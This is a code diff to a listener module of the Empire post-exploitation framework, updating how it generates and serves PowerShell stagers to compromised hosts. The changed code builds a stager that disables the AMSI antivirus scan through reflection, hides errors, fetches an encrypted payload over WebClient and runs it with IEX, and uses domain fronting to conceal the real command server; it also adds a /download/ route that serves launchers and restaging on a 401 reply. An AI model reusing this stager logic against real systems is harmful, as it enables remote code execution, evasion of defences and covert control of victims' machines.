@@ -1,5 +1,6 @@
 import logging
 import base64
+import sys
 import random
 import os
 import ssl
@@ -7,7 +8,6 @@ import time
 import copy
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
-import pdb
 # Empire imports
 from lib.common import helpers
 from lib.common import agents
@@ -108,7 +108,7 @@ class Listener:
                 'Value'         :   'Microsoft-IIS/7.5'
             },
             'StagerURI' : {
-                'Description'   :   'URI for the stager. Example: stager.php',
+                'Description'   :   'URI for the stager. Must use /download/. Example: /download/stager.php',
                 'Required'      :   False,
                 'Value'         :   ''
             },
@@ -126,6 +126,16 @@ class Listener:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'SlackToken' : {
+                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SlackChannel' : {
+                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
+                'Required'      :   False,
+                'Value'         :   '#general'
             }
         }
 
@@ -190,7 +200,7 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = ''
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
@@ -215,7 +225,7 @@ class Listener:
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
-                    stager += "}"
+                    stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
@@ -240,8 +250,7 @@ class Listener:
                             stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                         else:
                             # TODO: implement form for other proxy
-                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
-                            stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
+                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('"+ proxy.lower() +"');")
                             stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                         if proxyCreds.lower() == "default":
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
@@ -249,9 +258,13 @@ class Listener:
                             # TODO: implement form for other proxy credentials
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
-                            domain = username.split('\\')[0]
-                            usr = username.split('\\')[1]
-                            stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                            if len(username.split('\\')) > 1:
+                                usr = username.split('\\')[1]
+                                domain = username.split('\\')[0]
+                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                            else:
+                                usr = username.split('\\')[0]
+                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
 
                         #save the proxy settings to use during the entire staging process and the agent
@@ -286,10 +299,11 @@ class Listener:
                     for header in customHeaders:
                         headerKey = header.split(':')[0]
                         headerValue = header.split(':')[1]
-			#If host header defined, assume domain fronting is in use and add a call to the base URL first
-			#this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-			if headerKey.lower() == "host":
-			    stager += helpers.randomize_capitalization("try{$ig=$WC.DownloadData($ser)}catch{};")
+                        #If host header defined, assume domain fronting is in use and add a call to the base URL first
+                        #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+                        if headerKey.lower() == "host":
+                            stager += helpers.randomize_capitalization("try{$ig=$WC.DownloadData($ser)}catch{};")
+
                         stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                         stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
 
@@ -306,7 +320,7 @@ class Listener:
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    stager = helpers.obfuscate(stager, obfuscationCommand=obfuscationCommand)
+                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
@@ -485,7 +499,7 @@ class Listener:
                         randomizedStager += line
 
             if obfuscate:
-                randomizedStager = helpers.obfuscate(randomizedStager, obfuscationCommand=obfuscationCommand)
+                randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager, obfuscationCommand=obfuscationCommand)
             # base64 encode the stager and return it
             if encode:
                 return helpers.enc_powershell(randomizedStager)
@@ -576,7 +590,7 @@ class Listener:
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
             if obfuscate:
-                code = helpers.obfuscate(code, obfuscationCommand=obfuscationCommand)
+                code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
             return code
 
         elif language == 'python':
@@ -699,6 +713,10 @@ class Listener:
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                        # restart key negotiation
+                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
+                                    }
                                 }
                             }
                         }
@@ -749,6 +767,10 @@ def send_message(packets=None):
     except urllib2.HTTPError as HTTPError:
         # if the server is reached, but returns an erro (like 404)
         missedCheckins = missedCheckins + 1
+        #if signaled for restaging, exit.
+        if HTTPError.code == 401:
+            sys.exit(0)
+
         return (HTTPError.code, '')
 
     except urllib2.URLError as URLerror:
@@ -792,9 +814,9 @@ def send_message(packets=None):
         self.app = app
 
 
-        @app.route('/<string:stagerURI>')
-        def send_stager(stagerURI):
-            if stagerURI:
+        @app.route('/download/<stager>')
+        def send_stager(stager):
+            if stager:
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                 return launcher
             else:
@@ -873,7 +895,7 @@ def send_message(packets=None):
 
                                 if 'not in cache' in results:
                                     # signal the client to restage
-                                    print helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP))
+                                    print helpers.color("[*] Orphaned agent from %s, signaling restaging" % (clientIP))
                                     return make_response(self.default_response(), 401)
                                 else:
                                     return make_response(self.default_response(), 200)
@@ -952,7 +974,18 @@ def send_message(packets=None):
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
                 certPath = os.path.abspath(certPath)
-                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+                pyversion = sys.version_info
+
+                # support any version of tls
+                pyversion = sys.version_info
+                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
+                    proto = ssl.PROTOCOL_TLS
+                elif pyversion[0] >= 3:
+                    proto = ssl.PROTOCOL_TLS
+                else:
+                    proto = ssl.PROTOCOL_SSLv23
+
+                context = ssl.SSLContext(proto)
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
